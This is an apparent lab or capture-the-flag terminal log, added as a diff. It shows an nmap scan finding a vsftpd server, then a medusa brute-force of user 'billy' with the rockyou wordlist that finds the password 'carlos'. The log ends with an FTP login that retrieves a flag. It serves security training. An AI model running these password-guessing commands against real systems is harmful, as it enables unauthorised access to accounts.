@@ -1,0 +1,114 @@
+root@attackdefense:/# ip addr
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+1131: eth0@if1132: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
+    link/ether 02:42:0a:01:01:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 10.1.1.3/24 brd 10.1.1.255 scope global eth0
+       valid_lft forever preferred_lft forever
+1134: eth1@if1135: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
+    link/ether 02:42:c0:b7:8e:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 192.183.142.2/24 brd 192.183.142.255 scope global eth1
+       valid_lft forever preferred_lft forever
+root@attackdefense:/#
+root@attackdefense:/# nmap -sV 192.183.142.3
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-06 11:40 UTC
+Nmap scan report for jplw1fcbamu1bgzerq03srw33.temp-network_a-183-142 (192.183.142.3)
+Host is up (0.000012s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+MAC Address: 02:42:C0:B7:8E:03 (Unknown)
+Service Info: OS: Unix
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 0.54 seconds
+root@attackdefense:/cd usr/share/wordlists
+root@attackdefense:/usr/share/wordlists# gunzip rockyou.txt.gzip
+root@attackdefense:/usr/share/wordlists# medusa
+Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+ALERT: Host information must be supplied.
+
+Syntax: Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]
+  -h [TEXT]    : Target hostname or IP address
+  -H [FILE]    : File containing target hostnames or IP addresses
+  -u [TEXT]    : Username to test
+  -U [FILE]    : File containing usernames to test
+  -p [TEXT]    : Password to test
+  -P [FILE]    : File containing passwords to test
+  -C [FILE]    : File containing combo entries. See README for more information.
+  -O [FILE]    : File to append log information to
+  -e [n/s/ns]  : Additional password checks ([n] No Password, [s] Password = Username)
+  -M [TEXT]    : Name of the module to execute (without the .mod extension)
+  -m [TEXT]    : Parameter to pass to the module. This can be passed multiple times with a
+                 different parameter each time and they will all be sent to the module (i.e.
+                 -m Param1 -m Param2, etc.)
+  -d           : Dump all known modules
+  -n [NUM]     : Use for non-default TCP port number
+  -s           : Enable SSL
+  -g [NUM]     : Give up after trying to connect for NUM seconds (default 3)
+  -r [NUM]     : Sleep NUM seconds between retry attempts (default 3)
+  -R [NUM]     : Attempt NUM retries before giving up. The total number of attempts will be NUM + 1.
+  -c [NUM]     : Time to wait in usec to verify socket is available (default 500 usec).
+  -t [NUM]     : Total number of logins to be tested concurrently
+  -T [NUM]     : Total number of hosts to be tested concurrently
+  -L           : Parallelize logins using one username per thread. The default is to process
+                 the entire username before proceeding.
+  -f           : Stop scanning host after first valid username/password found.
+  -F           : Stop audit after first valid username/password found on any host.
+  -b           : Suppress startup banner
+  -q           : Display module's usage information
+  -v [NUM]     : Verbose level [0 - 6 (more)]
+  -w [NUM]     : Error debug level [0 - 10 (more)]
+  -V           : Display version
+  -Z [TEXT]    : Resume scan based on map of previous scan
+
+
+root@attackdefense:/usr/share/wordlists# medusa -h 192.183.142.3 -u billy -P rockyou.txt  -M ftp
+Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+ACCOUNT CHECK: [ftp] Host: 192.183.142.3 (1 of 1, 0 complete) User: billy (1 of 1, 0 complete) Password: 123456 (1 of 14344391 complete)
+ACCOUNT CHECK: [ftp] Host: 192.183.142.3 (1 of 1, 0 complete) User: billy (1 of 1, 0 complete) Password: 12345 (2 of 14344391 complete)
+ACCOUNT CHECK: [ftp] Host: 192.183.142.3 (1 of 1, 0 complete) User: billy (1 of 1, 0 complete) Password: 123456789 (3 of 14344391 complete)
+ACCOUNT CHECK: [ftp] Host: 192.183.142.3 (1 of 1, 0 complete) User: billy (1 of 1, 0 complete) Password: password (4 of 14344391 complete)
+ACCOUNT CHECK: [ftp] Host: 192.183.142.3 (1 of 1, 0 complete) User: billy (1 of 1, 0 complete) Password: iloveyou (5 of 14344391 complete)
+ACCOUNT CHECK: [ftp] Host: 192.183.142.3 (1 of 1, 0 complete) User: billy (1 of 1, 0 complete) Password: princess (6 of 14344391 complete)
+ACCOUNT CHECK: [ftp] Host: 192.183.142.3 (1 of 1, 0 complete) User: billy (1 of 1, 0 complete) Password: 1234567 (7 of 14344391 complete)
+ACCOUNT CHECK: [ftp] Host: 192.183.142.3 (1 of 1, 0 complete) User: billy (1 of 1, 0 complete) Password: rockyou (8 of 14344391 complete)
+ACCOUNT CHECK: [ftp] Host: 192.183.142.3 (1 of 1, 0 complete) User: billy (1 of 1, 0 complete) Password: 12345678 (9 of 14344391 complete)
+ACCOUNT CHECK: [ftp] Host: 192.183.142.3 (1 of 1, 0 complete) User: billy (1 of 1, 0 complete) Password: abc123 (10 of 14344391 complete)
+ACCOUNT CHECK: [ftp] Host: 192.183.142.3 (1 of 1, 0 complete) User: billy (1 of 1, 0 complete) Password: nicole (11 of 14344391 complete)
+ACCOUNT CHECK: [ftp] Host: 192.183.142.3 (1 of 1, 0 complete) User: billy (1 of 1, 0 complete) Password: daniel (12 of 14344391 complete)
+ACCOUNT CHECK: [ftp] Host: 192.183.142.3 (1 of 1, 0 complete) User: billy (1 of 1, 0 complete) Password: babygirl (13 of 14344391 complete)
+ACCOUNT CHECK: [ftp] Host: 192.183.142.3 (1 of 1, 0 complete) User: billy (1 of 1, 0 complete) Password: monkey (14 of 14344391 complete)
+ACCOUNT CHECK: [ftp] Host: 192.183.142.3 (1 of 1, 0 complete) User: billy (1 of 1, 0 complete) Password: lovely (15 of 14344391 complete)
+ACCOUNT CHECK: [ftp] Host: 192.183.142.3 (1 of 1, 0 complete) User: billy (1 of 1, 0 complete) Password: carlos (16 of 14344391 complete)
+ACCOUNT FOUND: [ftp] Host: 192.183.142.3 User: billy Password: carlos [SUCCESS]
+root@attackdefense:/usr/share/wordlists#
+root@attackdefense:/usr/share/wordlists# ftp 192.183.142.3
+Connected to 192.183.142.3.
+220 (vsFTPd 3.0.3)
+Name (192.183.142.3:root): billy
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0              33 Dec 18 12:12 flag
+226 Directory send OK.
+ftp> get flag
+local: flag remote: flag
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for flag (33 bytes).
+226 Transfer complete.
+33 bytes received in 0.00 secs (546.2129 kB/s)
+ftp> exit
+221 Goodbye.
+root@attackdefense:/usr/share/wordlists# cat flag
+c07c7a9be16f43bb473ed7b604295c0b
+root@attackdefense:/usr/share/wordlists#
